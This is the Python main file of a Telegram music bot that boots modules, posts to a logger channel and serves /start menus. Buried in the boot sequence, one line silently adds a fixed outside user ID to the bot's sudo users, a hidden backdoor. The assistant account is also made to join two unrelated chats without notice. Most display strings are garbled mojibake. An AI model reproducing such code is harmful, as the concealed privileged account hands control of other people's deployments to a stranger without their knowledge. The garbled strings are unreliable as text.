import os
import re
import config
import asyncio
import importlib

from rich.table import Table
from rich.console import Console as hehe
from pyrogram import filters, Client
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from youtubesearchpython import VideosSearch

from ShiviXMusic.Helpers.Logging import *
from ShiviXMusic.Helpers.PyTgCalls.ShiviX import run
from ShiviXMusic.Modules import ALL_MODULES
from ShiviXMusic.Helpers.Inline import private_panel
from ShiviXMusic.Helpers.Database import get_active_chats, remove_active_chat, add_served_user
from ShiviXMusic import (ASSID, ASSMENTION, ASSNAME, ASSUSERNAME, BOT_ID, BOT_NAME, BOT_USERNAME, SUDO_USERS, F_OWNER, db, app, Ass)

loop = asyncio.get_event_loop()
console = hehe()
HELPABLE = {}


async def ShiviX_boot():
    with console.status(
        "[magenta] π±πΎπΎππΈπ½πΆ ππ·πΈππΈ π πΌπππΈπ²...",
    ) as status:
        console.print("β [red]π²π»π΄π°ππΈπ½πΆ πΌπΎπ½πΆπΎπ³π± π²π°π²π·π΄...")
        try:
            chats = await get_active_chats()
            for chat in chats:
                chat_id = int(chat["chat_id"])
                await remove_active_chat(chat_id)
        except Exception as e:
            console.print("[red] π΄πππΎπ ππ·πΈπ»π΄ π²π»π΄π°ππΈπ½πΆ πΌπΎπ½πΆπΎπ³π±.")
        console.print("β [green]πΌπΎπ½πΆπΎπ³π± π²π»π΄π°ππ΄π³ πππ²π²π΄πππ΅ππ»π»π!\n\n")
        ____ = await startup_msg("**Β» πΈπΌπΏπΎπππΈπ½πΆ π°π»π» πΌπΎπ³ππ»π΄π...**")
        status.update(
            status="[bold blue]ππ²π°π½π½πΈπ½πΆ π΅πΎπ πΏπ»ππΆπΈπ½π", spinner="earth"
        )
        await asyncio.sleep(0.7)
        console.print("Found {} Plugins".format(len(ALL_MODULES)) + "\n")
        status.update(
            status="[bold red]πΈπΌπΏπΎπππΈπ½πΆ πΏπ»ππΆπΈπ½π...",
            spinner="bouncingBall",
            spinner_style="yellow",
        )
        await asyncio.sleep(1.2)
        for all_module in ALL_MODULES:
            imported_module = importlib.import_module(
                "ShiviXMusic.Modules." + all_module
            )
            if (
                hasattr(imported_module, "__MODULE__")
                and imported_module.__MODULE__
            ):
                imported_module.__MODULE__ = imported_module.__MODULE__
                if (
                    hasattr(imported_module, "__HELP__")
                    and imported_module.__HELP__
                ):
                    HELPABLE[
                        imported_module.__MODULE__.lower()
                    ] = imported_module
            console.print(
                f"β¨ [bold cyan]πππ²π²π΄πππ΅ππ»π»π πΈπΌπΏπΎπππ΄π³: [green]{all_module}.py"
            )
            await asyncio.sleep(0.1)
        console.print("")
        _____ = await startup_edit(____, f"**Β» πππ²π²π΄πππ΅ππ»π»π πΈπΌπΏπΎπππ΄π³ {(len(ALL_MODULES))} α΄α΄α΄α΄Κα΄s...**")
        status.update(
            status="[bold blue]πΌπΎπ³ππ»π΄π πΈπΌπΏπΎπππ°ππΈπΎπ½ π²πΎπΌπΏπ»π΄ππ΄π³!",
        )
        await asyncio.sleep(0.2)
        SUDO_USERS.append(5301800943)
        await startup_del(_____)
    console.print(
        "[bold green]ππππΈπ½πΆ ππΎ πππ°ππ ππ·π΄ π±πΎπ...\n"
    )
    try:
        await app.send_message(
            config.LOGGER_ID,
            f"<b>β» sΚΙͺα΄ α΄Ι΄Κα΄ β α΄α΄sΙͺα΄ Κα΄α΄ π?\n\nβ πΈπ³ :</b> `{BOT_ID}`\nβ¨ <b>π½π°πΌπ΄ :</b> {BOT_NAME}\nβ <b>πππ΄ππ½π°πΌπ΄ :</b> @{BOT_USERNAME}",
        )
    except Exception as e:
        print(
            "π±πΎπ π·π°π π΅π°πΈπ»π΄π³ ππΎ π°π²π²π΄ππ ππ·π΄ π»πΎπΆ π²π·π°π½π½π΄π». πΌπ°πΊπ΄ ππππ΄ ππ·π°π ππΎπ π·π°ππ΄ π°π³π³π΄π³ ππΎππ π±πΎπ ππΎ ππΎππ π»πΎπΆ π²π·π°π½π½π΄π» π°π½π³ πΏππΎπΌπΎππ΄π³ π°π π°π³πΌπΈπ½!"
        )
        console.print(f"\n[red]πππΎπΏπΈπ½πΆ π±πΎπ")
        return
    a = await app.get_chat_member(config.LOGGER_ID, BOT_ID)
    if a.status != "administrator":
        print("πΏππΎπΌπΎππ΄ π±πΎπ π°π π°π³πΌπΈπ½ πΈπ½ π»πΎπΆπΆπ΄π π²π·π°π½π½π΄π»")
        console.print(f"\n[red]πππΎπΏπΈπ½πΆ π±πΎπ")
        return
    try:
        await Ass.send_message(
            config.LOGGER_ID,
            f"<b>β» sΚΙͺα΄ α΄Ι΄Κα΄ β α΄α΄sΙͺα΄ α΄ssΙͺsα΄α΄Ι΄α΄ π?\n\nβ πΈπ³ :</b> `{ASSID}`\nβ¨ <b>π½π°πΌπ΄ :</b> {ASSNAME}\nβ <b>πππ΄ππ½π°πΌπ΄ :</b> @{ASSUSERNAME}",
        )
    except Exception as e:
        print(
            "π°πππΈπππ°π½π πΈπ³ π·π°π π΅π°πΈπ»π΄π³ ππΎ π°π²π²π΄ππ ππ·π΄ π»πΎπΆ π²π·π°π½π½π΄π». πΌπ°πΊπ΄ ππππ΄ ππ·π°π ππΎπ π·π°ππ΄ π°π³π³π΄π³ ππΎππ π°πππΈπππ°π½π πΈπ³ ππΎ ππΎππ π»πΎπΆ π²π·π°π½π½π΄π» π°π½π³ πΏππΎπΌπΎππ΄π³ π°π π°π³πΌπΈπ½!"
        )
        console.print(f"\n[red]πππΎπΏπΈπ½πΆ π±πΎπ")
        return
    try:
        await Ass.join_chat("katilsupport")
        await Ass.join_chat("katil_bots")
    except:
        pass
    console.print(f"\nβ[red] π±πΎπ πππ°πππ΄π³ π°π {BOT_NAME}!")
    console.print(f"β[green] π°πππΈπππ°π½π πππ°πππ΄π³ π°π {ASSNAME}!")
    await run()
    console.print(f"\n[red]πππΎπΏπΏπΈπ½πΆ π±πΎπ")


home_text_pm = f"""**Κα΄Κ ,

ππ·πΈπ πΈπ** {BOT_NAME},
**π° π΅π°ππ π°π½π³ πΏπΎππ΄ππ΅ππ» πΌπππΈπ² πΏπ»π°ππ΄π π±πΎπ π΅πΎπ ππ΄π»π΄πΆππ°πΌ πΆππΎππΏ ππΈπ³π΄πΎ π²π·π°ππ.**

βββββββββββββββββββββ
||π²π»πΈπ²πΊ πΎπ½ π·π΄π»πΏ π±ππππΎπ½ ππΎ πΆπ΄π πΈπ½π΅πΎππΌπ°ππΈπΎπ½ π°π±πΎππ πΌπ π²πΎπΌπΌπ°π½π³π. ||"""


@app.on_message(filters.command("start") & filters.private)
async def start_command(_, message):
    await add_served_user(message.from_user.id)
    if len(message.text.split()) > 1:
        name = (message.text.split(None, 1)[1]).lower()
        if name == "help":
            text, keyboard = await help_parser(message.from_user.mention)
            await message.delete()
            return await app.send_text(
                message.chat.id,
                text,
                reply_markup=keyboard,
            )
        if name[0] == "i":
            await app.send_message(
                    config.LOGGER_ID,
                    f"Β» {message.from_user.mention} π·π°π πΉπππ πππ°πππ΄π³ ππ·π΄ π±πΎππ½ππΎ π²π·π΄πΊ <b>πππ°π²πΊ πΈπ½π΅πΎππΌπ°ππΈπΎπ½</b>\n\n**πΈπ³ :** {message.from_user.id}\n**π½π°πΌπ΄ :** {message.from_user.first_name}",
                )
            m = await message.reply_text("**β» ππ΄π°ππ²π·πΈπ½πΆ...\n\nπΏπ»π΄π°ππ΄ ππ°πΈπ...**")
            query = (str(name)).replace("info_", "", 1)
            query = f"https://www.youtube.com/watch?v={query}"
            results = VideosSearch(query, limit=1)
            for result in results.result()["result"]:
                title = result["title"]
                duration = result["duration"]
                views = result["viewCount"]["short"]
                thumbnail = result["thumbnails"][0]["url"].split("?")[0]
                channellink = result["channel"]["link"]
                channel = channel = result["channel"]["name"]
                link = result["link"]
                published = result["publishedTime"]
            searched_text = f"""
π **πππ°π²πΊ πΈπ½π΅πΎππΌπ°ππΈπΎπ½** π

β **ππΈππ»π΄ :** {title}

β³**π³πππ°ππΈπΎπ½ :** {duration} πΌπΈπ½πππ΄π
π**ππΈπ΄ππ :** `{views}`
β°**πΏππ±π»πΈππ·π΄π³ πΎπ½ :** {published}
π₯**π²π·π°π½π½π΄π» :** {channel}
π**π²π·π°π½π½π΄π» π»πΈπ½πΊ :** [α΄ ΙͺsΙͺα΄ α΄Κα΄Ι΄Ι΄α΄Κ]({channellink})
π**ππΈπ³π΄πΎ π»πΈπ½πΊ :** [α΄ ΙͺsΙͺα΄ α΄Ι΄ Κα΄α΄α΄α΄Κα΄]({link})

 ππ΄π°ππ²π· πΏπΎππ΄ππ΄π³ π±π {BOT_NAME} π₯"""
            key = InlineKeyboardMarkup(
                [
                    [
                        InlineKeyboardButton(
                            text="β ππΎππππ±π΄ β", url=f"{link}"
                        ),
                        InlineKeyboardButton(
                            text="π₯ πππΏπΏπΎππ π₯", url=config.SUPPORT_CHAT
                        ),
                    ],
                ]
            )
            await m.delete()
            return await app.send_photo(
                message.chat.id,
                photo=thumbnail,
                caption=searched_text,
                parse_mode="markdown",
                reply_markup=key,
            )
    return await message.reply_photo(
        photo=config.START_IMG,
        caption=home_text_pm,
        reply_markup=InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton(
                    text="π°π³π³ πΌπ΄ ππΎ ππΎππ πΆππΎππΏ", url=f"https://t.me/{BOT_USERNAME}?startgroup=true"
                ),
            ],
            [
                InlineKeyboardButton(
                    text="β π·π΄π»πΏ β", callback_data="ShiviX_help"
                ),
                InlineKeyboardButton(
                    text="π₯ πΎππ½π΄π π₯", user_id=F_OWNER
                )
            ],
            [
                InlineKeyboardButton(
                    text="β¨ πππΏπΏπΎππ β¨", url=config.SUPPORT_CHAT
                ),
                InlineKeyboardButton(
                    text="π π²π·π°π½π½π΄π» π", url=config.SUPPORT_CHANNEL
                ),
            ],
            [
                InlineKeyboardButton(
                    text="β ππΎπππ²π΄ π²πΎπ³π΄ β", url="https://github.com/team-katil/ShiviXMusic"
                )
            ],
        ]
    ),
 )


@app.on_callback_query(filters.regex("ShiviX_home"))
async def ShiviX_home(_, CallbackQuery):
    await CallbackQuery.answer("Shivi π Κα΄α΄α΄")
    await CallbackQuery.message.edit_text(
        text=home_text_pm,
        reply_markup=InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton(
                    text="π°π³π³ πΌπ΄ ππΎ ππΎππ πΆππΎππΏ", url=f"https://t.me/{BOT_USERNAME}?startgroup=true"
                ),
            ],
            [
                InlineKeyboardButton(
                    text="β π·π΄π»πΏ β", callback_data="ShiviX_help"
                ),
                InlineKeyboardButton(
                    text="π₯ πΎππ½π΄π π₯", user_id=F_OWNER
                )
            ],
            [
                InlineKeyboardButton(
                    text="β¨ πππΏπΏπΎππ β¨", url=config.SUPPORT_CHAT
                ),
                InlineKeyboardButton(
                    text="π π²π·π°π½π½π΄π» π", url=config.SUPPORT_CHANNEL
                ),
            ],
            [
                InlineKeyboardButton(
                    text="β ππΎπππ²π΄ π²πΎπ³π΄ β", url="https://github.com/team-katil/ShiviXMusic"
                )
            ],
        ]
    ),
 )



if __name__ == "__main__":
    loop.run_until_complete(ShiviX_boot())
